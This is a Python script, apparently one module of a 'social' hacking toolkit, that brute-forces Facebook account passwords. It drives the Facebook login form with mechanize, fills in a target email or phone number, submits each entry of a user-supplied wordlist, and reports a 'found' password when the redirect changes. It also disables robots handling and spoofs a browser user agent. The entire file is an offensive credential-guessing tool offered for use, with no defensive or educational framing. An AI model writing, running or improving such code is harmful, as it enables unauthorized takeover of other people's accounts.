import os
import progressbar
import time
import colorama
from colorama import Back,Style,Fore
from os import system
import random
import mechanize
import social
import http.cookiejar as cookielib
def main():
 global usr
 usr="Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
 global url
 url="https://facebook.com/login.php?login_attempt=1"
 global b
 b=mechanize.Browser()
 settings()
 user=input("Enter username(email or phone-number):")
 password_path=input("Enter path to wordlist:")
 checklist(password_path)
 bruteforce(user,password_path)
def bruteforce(user,password_path):
 print("Starting...")
 time.sleep(0.07)
 pasfile=open(password_path,'r')
 for ps in pasfile:
  b.select_form(nr = 0)
  b.form['email']= user
  b.form['pass']= ps
  su=b.submit()
  l=su.geturl()
  if l != url and not 'login_attempt' in l:
   print(Fore.GREEN+"Password was founded!"+Fore.RESET)
   print("Password:"+ps)
   print("3) Back")
   ask=input("<SOCIAL>")
   if ask == '3':
    social.brute()
   else:
    print("Ok,goodbye...")
    exit(0) 
def settings():
 cook=cookielib.LWPCookieJar()
 b.set_handle_robots(False)
 b.set_handle_redirect(True)
 b.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 b.set_handle_equiv(True)
 b.set_handle_referer(True)
 b.set_cookiejar(cook)
 b.addheaders=[('User-agent',usr)]
 b.open(url)
 print(Fore.GREEN+"Settings complete!"+Fore.RESET)
def checklist(password_path):
  file=open(password_path,'r')
  file=file.readlines()
  if len(file) == 0:
   print(Fore.RED+"Error(wordlist is empty or not exists)"+Fore.RESET)
   print("5) Back")
   ask=input("<SOCIAL>")
   if ask == "5":
    social.brute()
   else:
    print("Ok,goodbye..")
    exit(0) 
  else:
   print(Fore.GREEN+"Founded "+str(len(file))+" passwords"+Fore.RESET)  
